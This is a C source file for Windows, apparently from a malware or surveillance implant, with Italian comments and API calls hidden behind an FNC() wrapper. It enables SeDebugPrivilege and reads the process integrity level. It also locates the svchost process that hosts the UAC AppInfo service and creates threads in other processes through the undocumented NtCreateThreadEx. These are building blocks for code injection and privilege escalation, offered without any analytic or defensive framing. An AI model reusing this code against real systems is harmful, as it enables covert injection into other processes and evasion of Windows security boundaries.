void SetDebugPrivilege(BOOL to_set)
{
	HANDLE hProc = 0, hProcToken = 0;
	TOKEN_PRIVILEGES tp;
	LUID     luid;
	
	do {
		if (! (hProc = FNC(OpenProcess)(PROCESS_ALL_ACCESS, true, FNC(GetCurrentProcessId)())))
			break;
	
		if( !FNC(OpenProcessToken)(hProc, TOKEN_ALL_ACCESS, &hProcToken) ) 
			break;

		if (!FNC(LookupPrivilegeValueA) (NULL, SE_DEBUG_NAME, &luid))
			break;

		ZeroMemory (&tp, sizeof (tp));
		tp.PrivilegeCount = 1;
		tp.Privileges[0].Luid = luid;
		if (to_set)
			tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		else
			tp.Privileges[0].Attributes = 0;

		FNC(AdjustTokenPrivileges) (hProcToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
	} while (FALSE);

	if (hProcToken)	
		CloseHandle (hProcToken);
	if (hProc) 
		CloseHandle(hProc);
}


#define IL_UNKNOWN	0
#define IL_LOW		1
#define IL_MEDIUM	2
#define IL_HIGH		3
#define IL_SYSTEM	4

#define SECURITY_MANDATORY_UNTRUSTED_RID 		 (0x00000000L)
#define SECURITY_MANDATORY_LOW_RID 				 (0x00001000L)
#define SECURITY_MANDATORY_MEDIUM_RID 			 (0x00002000L)
#define SECURITY_MANDATORY_SYSTEM_RID 			 (0x00004000L)
#define SECURITY_MANDATORY_PROTECTED_PROCESS_RID (0x00005000L)
#define SECURITY_MANDATORY_HIGH_RID				 (0x00003000L)

/*typedef struct _TOKEN_MANDATORY_LABEL {
	SID_AND_ATTRIBUTES Label;
} TOKEN_MANDATORY_LABEL, *PTOKEN_MANDATORY_LABEL;*/

BOOL IsVista(DWORD *integrity_level)
{
	HANDLE hProc = 0, hProcToken = 0;
	BOOL is_vista = FALSE;
	PTOKEN_MANDATORY_LABEL pTIL = NULL;
	DWORD dwIntegrityLevel;
	DWORD dwLengthNeeded;

	if (integrity_level)
		*integrity_level = IL_UNKNOWN;

	do {
		if (! (hProc = FNC(OpenProcess)(PROCESS_ALL_ACCESS, true, FNC(GetCurrentProcessId)())))
			break;
	
		if( !FNC(OpenProcessToken)(hProc, TOKEN_ALL_ACCESS, &hProcToken) ) 
			break;

		if ( !FNC(GetTokenInformation)(hProcToken, (TOKEN_INFORMATION_CLASS) 25, NULL, 0, &dwLengthNeeded) ) {
			if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
				pTIL = (PTOKEN_MANDATORY_LABEL) LocalAlloc(0, dwLengthNeeded);
				if (pTIL != NULL) {
					if ( FNC(GetTokenInformation)(hProcToken, (TOKEN_INFORMATION_CLASS)25,  pTIL, dwLengthNeeded, &dwLengthNeeded) ) {
						// Se la FNC(GetTokenInformation) torna OK allora siamo su vista
						is_vista = TRUE;
						dwIntegrityLevel = *FNC(GetSidSubAuthority)(pTIL->Label.Sid, (DWORD)(UCHAR)(*FNC(GetSidSubAuthorityCount)(pTIL->Label.Sid)-1));
						
						if (integrity_level) {
							if (dwIntegrityLevel == SECURITY_MANDATORY_LOW_RID) 
								*integrity_level = IL_LOW;
							else if (dwIntegrityLevel >= SECURITY_MANDATORY_MEDIUM_RID && dwIntegrityLevel < SECURITY_MANDATORY_HIGH_RID) 
								*integrity_level = IL_MEDIUM;
							else if (dwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID) 
								*integrity_level = IL_HIGH;
							else if (dwIntegrityLevel >= SECURITY_MANDATORY_SYSTEM_RID) 
								*integrity_level = IL_SYSTEM;
						}
					}
					LocalFree(pTIL);
				}
			}
		}

	} while (FALSE);

	if (hProcToken)	
		CloseHandle (hProcToken);
	if (hProc) 
		CloseHandle(hProc);

	return is_vista;
}

DWORD FindRunAsService()
{
	HANDLE hProcessSnap;
	HANDLE hModuleSnap;
	PROCESSENTRY32 pe32;
	MODULEENTRY32  me32;
	DWORD service_pid = 0;

	pe32.dwSize = sizeof( PROCESSENTRY32 );
	if ( (hProcessSnap = FNC(CreateToolhelp32Snapshot)( TH32CS_SNAPPROCESS, 0 )) == INVALID_HANDLE_VALUE )
		return 0;

	if( !FNC(Process32First)( hProcessSnap, &pe32 ) ) {
		CloseHandle( hProcessSnap );
		return 0;
	}

	// Cicla la lista dei processi attivi
	do {
		// Vede se e' un svchost
		if (stricmp("svchost.exe", pe32.szExeFile))
			continue;

		if ( (hModuleSnap = FNC(CreateToolhelp32Snapshot)( TH32CS_SNAPMODULE, pe32.th32ProcessID )) == INVALID_HANDLE_VALUE )
			continue;

		// Vede se ha il modulo appinfo.dll
		me32.dwSize = sizeof(MODULEENTRY32);
		if ( FNC(Module32First)(hModuleSnap, &me32) ) {
			do {
				if (!stricmp("appinfo.dll", me32.szModule)) {
					service_pid = pe32.th32ProcessID;
					break;
				}
			} while(FNC(Module32Next)(hModuleSnap, &me32));
		}

		CloseHandle( hModuleSnap );

		// Quando l'ha trovato finisce
		if (service_pid)
			break;
	} while( FNC(Process32Next)( hProcessSnap, &pe32 ) );

	CloseHandle( hProcessSnap );
	return service_pid;
}


typedef struct { 
	ULONG Length; 
	ULONG Unknown1; 
	ULONG Unknown2; 
	PULONG Unknown3; 
	ULONG Unknown4; 
	ULONG Unknown5; 
	ULONG Unknown6; 
	PULONG Unknown7; 
	ULONG Unknown8; 
} UnkVistaTh; 

typedef DWORD (WINAPI *NtCreateThreadEx_t) (PHANDLE, ACCESS_MASK, DWORD, HANDLE, LPTHREAD_START_ROUTINE, LPVOID, BOOL, DWORD, DWORD, DWORD, LPVOID); 

HANDLE VistaCreateRemoteThread(HANDLE hProcess, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter)
{
	HANDLE hRemoteThread = NULL;
	NtCreateThreadEx_t pNtCreateThreadEx; 
	UnkVistaTh thread_desc; 
	DWORD dw0 = 0; 
	DWORD dw1 = 0; 

	pNtCreateThreadEx = (NtCreateThreadEx_t) GetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateThreadEx" ); 
	if (!pNtCreateThreadEx)
		return NULL;

	ZeroMemory(&thread_desc, sizeof(thread_desc));
	thread_desc.Length = 36; 
	thread_desc.Unknown1 = 0x10003; 
	thread_desc.Unknown2 = 0x8; 
	thread_desc.Unknown3 = &dw0; 
	thread_desc.Unknown4 = 0; 
	thread_desc.Unknown5 = 0x10004; 
	thread_desc.Unknown6 = 4; 
	thread_desc.Unknown7 = &dw1; 
	thread_desc.Unknown8 = 0; 

	pNtCreateThreadEx (&hRemoteThread, 0x1FFFFF, NULL, hProcess, lpStartAddress, 
		               lpParameter, FALSE, NULL, NULL, NULL, &thread_desc);

	return hRemoteThread;
}